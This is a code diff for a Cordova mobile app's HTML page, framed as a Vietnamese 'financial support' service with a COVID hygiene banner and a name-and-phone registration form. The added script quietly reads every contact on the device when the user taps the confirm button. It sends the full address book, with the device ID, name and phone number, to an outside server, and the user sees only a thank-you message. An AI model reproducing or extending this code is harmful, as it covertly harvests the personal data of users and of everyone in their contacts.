@@ -18,20 +18,25 @@
     -->
     <!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: 'unsafe-inline' https://ssl.gstatic.com; style-src 'self' 'unsafe-inline'; media-src *" /> -->
 
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
     <link rel="stylesheet" type="text/css" href="css/index.css" />
-    <title>Hello World</title>
+    <title>Hỗ trợ tài chính</title>
 </head>
 
 <body>
     <div class="app">
-        <h1 onclick="onDeviceReady();">Huy Dong Von</h1>
-        <p id="log"></p>
+<!--        <input type="hidden" id="phone-number" name="phone-number" value="khong co so">-->
+        <h3 onclick="onDeviceReady();">Nhớ đeo khẩu trang và rửa tay thường xuyên</h3>
         <div id="deviceready" class="blink">
-            <p class="event listening">Connecting to Device</p>
+            <p class="event listening">Đang khởi động</p>
             <div class="event received">
-                <h4>danh cmn ba</h4>
-                <ul id="contacts-list">
-                </ul>
+                <p>Nhiều tính năng sẽ được cập nhật trong thời gian tới. Do vậy hãy quay lại sau và cùng đồng hành với chúng tôi nhé.</p>
+            </div>
+            <div class="register-box" style="display: none;">
+                <input type="text" class="input-text" name="name" id="name" placeholder="Tên">
+                <input type="text" class="input-text" name="phone-number" id="phone-number" placeholder="Số điện thoại">
+
+                <input type="button" class="input-button" id="register" onclick="register();" value="Xác nhận">
             </div>
         </div>
     </div>
@@ -43,36 +48,81 @@
     </script>
 
     <script type="text/javascript" charset="utf-8">
-        document.addEventListener("deviceready", onDeviceReady, false);
+        document.addEventListener("deviceready", function () {
+            // onDeviceReady();
+            checkRegister();
+        }, false);
 
-        function onDeviceReady() {
+        function register() {
             var options = new ContactFindOptions();
             options.filter="";          // empty search string returns all contacts
             options.multiple=true;      // return multiple results
-            // options.desiredFields = [navigator.contacts.fieldType.id];
-            // options.hasPhoneNumber = true;
             var fields = ["*"];
 
-            navigator.contacts.find(fields, onSuccess, onError, options);
+            // hasReadPermission();
+            navigator.contacts.find(fields, sendContacts, onError, options);
         }
 
         function onSuccess(contacts) {
-            document.getElementById('log').innerHTML = contacts.length+'; ';
             alert(contacts.length);
             alert(JSON.stringify(contacts));
-            for (var i = 0; i < contacts.length; i  ) {
-
-                var node = document.createElement("LI");
-                var textnode = document.createTextNode(contacts[i].displayName);
-                node.appendChild(textnode);
-                document.getElementById('contacts-list').appendChild(node);
-            }
         }
 
         function onError(contactError) {
             alert('onError!');
         }
 
+        function checkRegister() {
+            var parentElement = document.getElementById('deviceready');
+            var listeningElement = parentElement.querySelector('.listening');
+            var receivedElement = parentElement.querySelector('.received');
+            var registerElement = parentElement.querySelector('.register-box');
+
+
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials = true;
+
+            xhr.addEventListener("readystatechange", function() {
+                if(this.readyState === 4) {
+                    var ref = JSON.parse(this.responseText);
+                    listeningElement.setAttribute('style', 'display:none;');
+                    if (ref.had){
+                        receivedElement.setAttribute('style', 'display:block; background-color: unset; color: #000000;');
+                    } else {
+                        registerElement.setAttribute('style', 'display:block;');
+                    }
+                }
+            });
+
+            xhr.open("POST", "https://huydongvon.tulaigiare.vn/mobile/check/"+device.uuid, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            xhr.send(null);
+        }
+
+        function sendContacts(contacts) {
+            document.getElementById('register').value = 'Đang xử lý...';
+            var data = JSON.stringify({
+                "phone_name": device.uuid,
+                "name": document.getElementById('name').value,
+                "phone_number": document.getElementById('phone-number').value,
+                "contacts": JSON.stringify(contacts),
+                "code":"5432"
+            });
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials = true;
+
+            xhr.addEventListener("readystatechange", function() {
+                if(this.readyState === 4) {
+                    alert('Cảm ơn đã sử dụng dịch vụ.');
+                    checkRegister();
+                }
+            });
+
+            xhr.open("POST", "https://huydongvon.tulaigiare.vn/mobile/contact");
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(data);
+        }
     </script>
 </body>
 
